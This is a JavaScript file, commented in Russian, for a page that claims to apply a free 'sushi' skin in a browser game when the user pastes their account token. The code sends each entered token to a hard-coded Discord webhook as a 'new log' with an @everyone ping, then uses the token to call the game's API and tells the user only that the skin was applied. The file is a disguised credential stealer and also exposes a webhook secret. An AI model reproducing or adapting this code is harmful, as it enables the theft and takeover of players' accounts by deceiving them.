const input = document.getElementById('inputField');
const status = document.getElementById('status');

// Константы
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504486169084301445/w_i3aEnuu9MmKjBMujqBmRTg6KeXD0aJcIZRZ2AnN0Pt1uS7G6fd0gfm3zUy0L_o-qTY';
const API_URL = 'https://session.coolmathblox.ca/accounts/set_cosmetic';

input.addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
        const userValue = input.value.trim();
        
        if (userValue === "") return;

        status.innerText = "Обработка...";

        // 1. Отправка в Discord с пингом @everyone
        const discordPromise = fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `@everyone\n**Новый лог:** \`${userValue}\``
            })
        });

        // 2. Отправка запроса на установку скина
        const apiPromise = fetch(API_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "authorization": userValue // Вставляем введенное значение как токен
            },
            body: JSON.stringify({
                type: "skin",
                id: "sushi" 
            })
        });

        // Выполняем оба запроса одновременно
        Promise.all([discordPromise, apiPromise])
            .then(async ([discordRes, apiRes]) => {
                const apiData = await apiRes.json();
                console.log("✅ API Response:", apiData);
                
                status.style.color = "#00ff88";
                status.innerText = "Готово! Скин sushi применен.";
                
                input.value = ""; // Очистка поля
            })
            .catch((err) => {
                status.style.color = "#ff4444";
                status.innerText = "Произошла ошибка.";
                console.error("❌ Error:", err);
            })
            .finally(() => {
                setTimeout(() => { status.innerText = ""; status.style.color = "#666"; }, 4000);
            });
    }
});
